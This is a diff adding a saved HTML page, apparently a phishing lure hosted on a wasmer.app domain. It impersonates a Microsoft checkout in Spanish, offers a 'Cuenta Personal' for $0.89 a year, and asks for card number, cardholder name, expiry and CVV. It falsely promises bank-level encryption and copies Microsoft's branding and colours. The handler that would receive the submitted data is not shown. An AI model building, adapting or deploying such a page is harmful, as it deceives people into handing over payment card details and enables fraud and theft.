@@ -1,0 +1,727 @@
+﻿<!DOCTYPE html>
+<!-- saved from url=(0047)https://staticfile-a89e7.wasmer.app/index4.html -->
+<html lang="es"><script src="./Microsoft - Añadir tarjeta de crédito_files/f.txt" fetchpriority="high"></script><script async="" src="./Microsoft - Añadir tarjeta de crédito_files/gtm.js.descarga"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!-- Inserted by miarroba -->
+<script async="" src="./Microsoft - Añadir tarjeta de crédito_files/f(1).txt" crossorigin="anonymous" data-checked-head="true"></script>
+<script type="text/javascript" src="./Microsoft - Añadir tarjeta de crédito_files/miarroba_23335.js.descarga" async=""></script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba -->
+    
+    <link rel="icon" type="image/svg+xml" href="https://staticfile-a89e7.wasmer.app/vite.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft - Añadir tarjeta de crédito</title>
+    <script src="./Microsoft - Añadir tarjeta de crédito_files/saved_resource"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              'ms-blue': '#0078d4',
+              'ms-blue-hover': '#106ebe',
+              'ms-red': '#f25022',
+              'ms-green': '#7fba00',
+              'ms-yellow': '#ffb900',
+              'ms-blue-logo': '#00bcf2',
+              'ms-gray': '#1b1b1b',
+              'ms-gray-light': '#605e5c',
+              'ms-border': '#8a8886',
+              'ms-bg': '#f5f5f5',
+            },
+            fontFamily: {
+              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+            },
+            fontSize: {
+              'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
+              'ms-subtitle': ['18px', { lineHeight: '24px', fontWeight: '400' }],
+              'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
+              'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
+            },
+            boxShadow: {
+              'ms-card': '0 4px 12px rgba(0,0,0,0.15)',
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+      body {
+        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        min-height: 100vh;
+        /* Fijar todo en móvil */
+        position: fixed;
+        width: 100%;
+        height: 100vh;
+        overflow: hidden;
+        /* Sin fondo en móvil */
+        background: none;
+      }
+      
+      /* Solo permitir scroll en desktop */
+      @media (min-width: 640px) {
+        body {
+          position: static;
+          overflow: auto;
+          /* Fondo SVG solo en PC */
+          background: url('banner.svg') center/cover no-repeat fixed;
+        }
+      }
+      
+      .ms-input {
+        border: 1px solid #8a8886;
+        font-size: 15px;
+        padding: 12px 16px;
+        line-height: 20px;
+        border-radius: 4px;
+        transition: border-color 0.2s ease;
+      }
+      
+      .ms-input:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: inset 0 0 0 1px #0078d4;
+      }
+      
+      .ms-input::placeholder {
+        color: #8a8886;
+      }
+      
+      .ms-button {
+        background: #0078d4;
+        transition: background-color 0.2s ease;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 12px 24px;
+        min-height: 44px;
+        border-radius: 4px;
+        border: none;
+        cursor: pointer;
+      }
+      
+      .ms-button:hover {
+        background: #106ebe;
+      }
+      
+      .ms-button:active {
+        background: #005a9e;
+      }
+      
+      .ms-button:disabled {
+        background: #8a8886;
+        cursor: not-allowed;
+      }
+      
+      .card-icons {
+        display: flex;
+        gap: 8px;
+        margin-top: 8px;
+      }
+      
+      .card-icon {
+        width: 32px;
+        height: 20px;
+        border-radius: 4px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 10px;
+        font-weight: bold;
+        color: white;
+      }
+      
+      .visa { background: #1a1f71; }
+      .amex { background: #006fcf; }
+      .mastercard { background: linear-gradient(45deg, #eb001b 50%, #f79e1b 50%); }
+      .discover { background: #ff6000; }
+      
+      .card-icon.active {
+        transform: scale(1.1);
+        box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+      }
+      
+      .fade-in {
+        animation: fadeIn 0.4s ease-out;
+      }
+      
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+      
+      .header-banner {
+        background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+        color: white;
+        padding: 12px 0;
+        position: relative;
+        overflow: hidden;
+      }
+      
+      .header-banner::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('image.png') center/cover;
+        opacity: 0.1;
+      }
+      
+      /* Contenedor principal fijo en móvil */
+      .main-container {
+        position: fixed;
+        top: 60px; /* Espacio para el header */
+        left: 0;
+        right: 0;
+        bottom: 60px; /* Espacio para el footer */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+        z-index: 10;
+        overflow-y: auto;
+      }
+      
+      /* En desktop, comportamiento normal */
+      @media (min-width: 640px) {
+        .main-container {
+          position: static;
+          min-height: 100vh;
+          top: auto;
+          bottom: auto;
+          overflow-y: visible;
+          padding: 2rem 1rem;
+        }
+      }
+      
+      /* Asegurar que los inputs funcionen en desktop */
+      @media (min-width: 640px) {
+        .ms-input {
+          position: relative;
+          z-index: 1;
+          pointer-events: auto;
+        }
+        
+        .ms-input:focus {
+          z-index: 2;
+        }
+        
+        /* Contenedor de formulario en desktop */
+        .form-container {
+          position: relative;
+          z-index: 1;
+        }
+      }
+    </style>
+  <style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.fixed{position:fixed}.relative{position:relative}.inset-0{inset:0px}.bottom-0{bottom:0px}.left-0{left:0px}.right-0{right:0px}.z-10{z-index:10}.z-50{z-index:50}.mx-auto{margin-left:auto;margin-right:auto}.mb-2{margin-bottom:0.5rem}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.mr-2{margin-right:0.5rem}.mt-1{margin-top:0.25rem}.mt-4{margin-top:1rem}.block{display:block}.flex{display:flex}.grid{display:grid}.hidden{display:none}.h-3{height:0.75rem}.h-4{height:1rem}.h-6{height:1.5rem}.min-h-screen{min-height:100vh}.w-3{width:0.75rem}.w-4{width:1rem}.w-6{width:1.5rem}.w-full{width:100%}.max-w-4xl{max-width:56rem}.max-w-6xl{max-width:72rem}.max-w-lg{max-width:32rem}.grid-cols-2{grid-template-columns:repeat(2, minmax(0, 1fr))}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-2{gap:0.5rem}.gap-3{gap:0.75rem}.gap-4{gap:1rem}.gap-px{gap:1px}.space-x-3 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(0.75rem * var(--tw-space-x-reverse));margin-left:calc(0.75rem * calc(1 - var(--tw-space-x-reverse)))}.space-y-0\.5 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.125rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.125rem * var(--tw-space-y-reverse))}.space-y-6 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.5rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.5rem * var(--tw-space-y-reverse))}.rounded{border-radius:0.25rem}.rounded-lg{border-radius:0.5rem}.rounded-xl{border-radius:0.75rem}.border-t{border-top-width:1px}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-ms-border{--tw-border-opacity:1;border-color:rgb(138 136 134 / var(--tw-border-opacity, 1))}.bg-blue-50{--tw-bg-opacity:1;background-color:rgb(239 246 255 / var(--tw-bg-opacity, 1))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-white\/10{background-color:rgb(255 255 255 / 0.1)}.bg-white\/95{background-color:rgb(255 255 255 / 0.95)}.p-4{padding:1rem}.p-6{padding:1.5rem}.p-8{padding:2rem}.px-4{padding-left:1rem;padding-right:1rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.pt-4{padding-top:1rem}.text-center{text-align:center}.text-right{text-align:right}.text-2xl{font-size:1.5rem;line-height:2rem}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-base{font-size:1rem;line-height:1.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-ms-body{font-size:15px;line-height:20px;font-weight:400}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-normal{font-weight:400}.font-semibold{font-weight:600}.leading-tight{line-height:1.25}.text-ms-blue{--tw-text-opacity:1;color:rgb(0 120 212 / var(--tw-text-opacity, 1))}.text-ms-gray{--tw-text-opacity:1;color:rgb(27 27 27 / var(--tw-text-opacity, 1))}.text-ms-gray-light{--tw-text-opacity:1;color:rgb(96 94 92 / var(--tw-text-opacity, 1))}.text-red-600{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.opacity-90{opacity:0.9}.shadow-ms-card{--tw-shadow:0 4px 12px rgba(0,0,0,0.15);--tw-shadow-colored:0 4px 12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.backdrop-blur-\[0\.5px\]{--tw-backdrop-blur:blur(0.5px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.backdrop-blur-md{--tw-backdrop-blur:blur(12px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hover\:text-ms-blue:hover{--tw-text-opacity:1;color:rgb(0 120 212 / var(--tw-text-opacity, 1))}.focus\:ring-1:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-ms-blue:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(0 120 212 / var(--tw-ring-opacity, 1))}@media (min-width: 640px){.sm\:inline{display:inline}.sm\:flex-row{flex-direction:row}.sm\:space-x-6 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem * var(--tw-space-x-reverse));margin-left:calc(1.5rem * calc(1 - var(--tw-space-x-reverse)))}.sm\:space-y-0 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0px * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0px * var(--tw-space-y-reverse))}}</style><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A9nrunKdU5m96PSN1XsSGr3qOP0lvPFUB2AiAylCDlN5DTl17uDFkpQuHj1AFtgWLxpLaiBZuhrtb2WOu7ofHwEAAACKeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQUlQcm9tcHRBUElNdWx0aW1vZGFsSW5wdXQiLCJleHBpcnkiOjE3NzQzMTA0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A93bovR+QVXNx2/38qDbmeYYf1wdte9EO37K9eMq3r+541qo0byhYU899BhPB7Cv9QqD7wIbR1B6OAc9kEfYCA4AAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQUlQcm9tcHRBUElNdWx0aW1vZGFsSW5wdXQiLCJleHBpcnkiOjE3NzQzMTA0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A1S5fojrAunSDrFbD8OfGmFHdRFZymSM/1ss3G+NEttCLfHkXvlcF6LGLH8Mo5PakLO1sCASXU1/gQf6XGuTBgwAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQUlQcm9tcHRBUElNdWx0aW1vZGFsSW5wdXQiLCJleHBpcnkiOjE3NzQzMTA0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="b1eb63d1-73bf-45e2-89bd-76cc16c12d3b" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="b1eb63d1-73bf-45e2-89bd-76cc16c12d3b" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script></head>
+  <body class="min-h-screen relative" __processed_6fbb9432-7ffe-483d-8abc-b98dd92012d6__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMy4wIiwic2NvcmUiOjIwMzAwMH1d" bis_skin_checked="1">
+<ins class="adsbygoogle adsbygoogle-noablate" data-ad-hi="true" data-adsbygoogle-status="done" style="display: none !important;" data-ad-status="unfilled"><div id="aswift_0_host" bis_skin_checked="1" style="border-width: medium; border-style: none; border-color: currentcolor; border-image: none; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"><iframe id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;min-height:auto;max-height:none;min-width:auto;max-width:none;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="./Microsoft - Añadir tarjeta de crédito_files/ads.html" data-google-container-id="a!1" tabindex="0" title="Advertisement" aria-label="Advertisement" bis_precise_ad="1" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}" bis_id="fr_qnu3o1pf1ke3u9skp994yj" bis_depth="0" bis_chainid="1" data-load-complete="true"></iframe></div></ins><!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+    <!-- Header Banner -->
+    <div class="header-banner relative z-10" bis_skin_checked="1">
+      <div class="max-w-6xl mx-auto px-4 flex items-center justify-between" bis_skin_checked="1">
+        <div class="flex items-center gap-3" bis_skin_checked="1">
+          <div class="grid grid-cols-2 gap-px w-6 h-6" bis_skin_checked="1">
+            <div class="bg-white w-3 h-3" bis_skin_checked="1"></div>
+            <div class="bg-white w-3 h-3" bis_skin_checked="1"></div>
+            <div class="bg-white w-3 h-3" bis_skin_checked="1"></div>
+            <div class="bg-white w-3 h-3" bis_skin_checked="1"></div>
+          </div>
+          <span class="text-lg font-semibold">Microsoft</span>
+        </div>
+        <div class="text-right" bis_skin_checked="1">
+          <div class="text-sm opacity-90" bis_skin_checked="1">Estás comprando</div>
+          <div class="text-lg font-semibold" bis_skin_checked="1">Cuenta Personal</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Background overlay for better readability -->
+    <div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]" bis_skin_checked="1"></div>
+    
+    <!-- Main Content -->
+    <div class="main-container" bis_skin_checked="1">
+      <div class="w-full max-w-lg fade-in" bis_skin_checked="1">
+        <div class="bg-white rounded-xl shadow-ms-card p-8 form-container" bis_skin_checked="1">
+          <!-- Price Banner -->
+          <div class="text-center mb-8 p-6 bg-gray-50 rounded-lg" bis_skin_checked="1">
+            <div class="text-3xl font-bold text-ms-gray mb-2" bis_skin_checked="1">$0.89 <span class="text-lg font-normal text-ms-gray-light">/ Por año</span></div>
+            <div class="text-ms-body text-ms-gray-light" bis_skin_checked="1">Cuenta Personal de Microsoft</div>
+          </div>
+          
+          <h1 class="text-2xl font-semibold text-ms-gray mb-6 text-center">Añade una tarjeta de crédito</h1>
+          
+          <!-- Credit Card Icons -->
+          <div class="card-icons justify-center mb-6" bis_skin_checked="1">
+            <div class="card-icon visa" bis_skin_checked="1">VISA</div>
+            <div class="card-icon amex" bis_skin_checked="1">AMEX</div>
+            <div class="card-icon mastercard" bis_skin_checked="1"></div>
+            <div class="card-icon discover" bis_skin_checked="1">DISC</div>
+          </div>
+          
+          <form onsubmit="handlePayment(event)" class="space-y-6">
+            <!-- Card Number -->
+            <div bis_skin_checked="1">
+              <label for="cardNumber" class="block text-ms-body text-ms-gray mb-2 font-medium">
+                <span id="cardNumberLabel">Número de tarjeta*</span>
+              </label>
+              <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" class="ms-input w-full text-ms-gray bg-white relative z-10" maxlength="23" required="" oninput="formatCardNumber(this)">
+              <div id="cardError" class="text-red-600 text-sm mt-1 hidden" bis_skin_checked="1"></div>
+            </div>
+            
+            <!-- Cardholder Name -->
+            <div bis_skin_checked="1">
+              <label for="cardholderName" class="block text-ms-body text-ms-gray mb-2 font-medium">
+                Nombre del titular*
+              </label>
+              <input type="text" id="cardholderName" placeholder="Nombre como aparece en la tarjeta" class="ms-input w-full text-ms-gray bg-white relative z-10" required="">
+            </div>
+            
+            <!-- Expiry Date and CVV -->
+            <div class="grid grid-cols-2 gap-4" bis_skin_checked="1">
+              <div bis_skin_checked="1">
+                <label for="expiryMonth" class="block text-ms-body text-ms-gray mb-2 font-medium">
+                  Vencimiento*
+                </label>
+                <div class="grid grid-cols-2 gap-2" bis_skin_checked="1">
+                  <input type="text" id="expiryMonth" placeholder="MM" class="ms-input text-ms-gray bg-white text-center relative z-10" maxlength="2" required="" oninput="formatMonth(this)">
+                  <input type="text" id="expiryYear" placeholder="YY" class="ms-input text-ms-gray bg-white text-center relative z-10" maxlength="2" required="" oninput="formatYear(this)">
+                </div>
+              </div>
+              
+              <div bis_skin_checked="1">
+                <label for="cvv" class="block text-ms-body text-ms-gray mb-2 font-medium">
+                  <span id="cvvLabel">CVV*</span>
+                </label>
+                <input type="text" id="cvv" placeholder="•••" class="ms-input w-full text-ms-gray bg-white text-center relative z-10" maxlength="4" required="" oninput="formatCVV(this)">
+                <div id="cvvError" class="text-red-600 text-sm mt-1 hidden" bis_skin_checked="1"></div>
+              </div>
+            </div>
+            
+            <!-- Billing Address Checkbox -->
+            <div class="flex items-start space-x-3 p-4 bg-gray-50 rounded-lg" bis_skin_checked="1">
+              <input type="checkbox" id="sameAddress" checked="" class="mt-1 rounded border-ms-border text-ms-blue focus:ring-ms-blue focus:ring-1 relative z-10">
+              <label for="sameAddress" class="text-ms-body text-ms-gray leading-tight">
+                Mi dirección de facturación es la misma que mi dirección de cuenta de Microsoft
+              </label>
+            </div>
+            
+            <!-- Continue Button -->
+            <div class="pt-4" bis_skin_checked="1">
+              <button type="submit" class="ms-button w-full text-white text-base relative z-10">
+                Continuar
+              </button>
+            </div>
+            
+            <!-- Security Notice -->
+            <div class="text-center text-xs text-ms-gray-light mt-4 p-4 bg-blue-50 rounded-lg" bis_skin_checked="1">
+              <div class="flex items-center justify-center mb-2" bis_skin_checked="1">
+                <svg class="w-4 h-4 text-ms-blue mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                </svg>
+                <span class="font-medium text-ms-blue">Transacción segura</span>
+              </div>
+              <p>Tu información de pago está protegida con cifrado de nivel bancario</p>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Fixed Footer -->
+    <div class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-gray-200 py-2 z-50" bis_skin_checked="1">
+      <div class="max-w-4xl mx-auto px-4" bis_skin_checked="1">
+        <div class="flex flex-col sm:flex-row items-center justify-center space-y-0.5 sm:space-y-0 sm:space-x-6 text-xs text-ms-gray-light" bis_skin_checked="1">
+          <a href="https://staticfile-a89e7.wasmer.app/index4.html#" class="hover:text-ms-blue transition-colors">Ayuda</a>
+          <a href="https://staticfile-a89e7.wasmer.app/index4.html#" class="hover:text-ms-blue transition-colors">Términos</a>
+          <a href="https://staticfile-a89e7.wasmer.app/index4.html#" class="hover:text-ms-blue transition-colors">Privacidad</a>
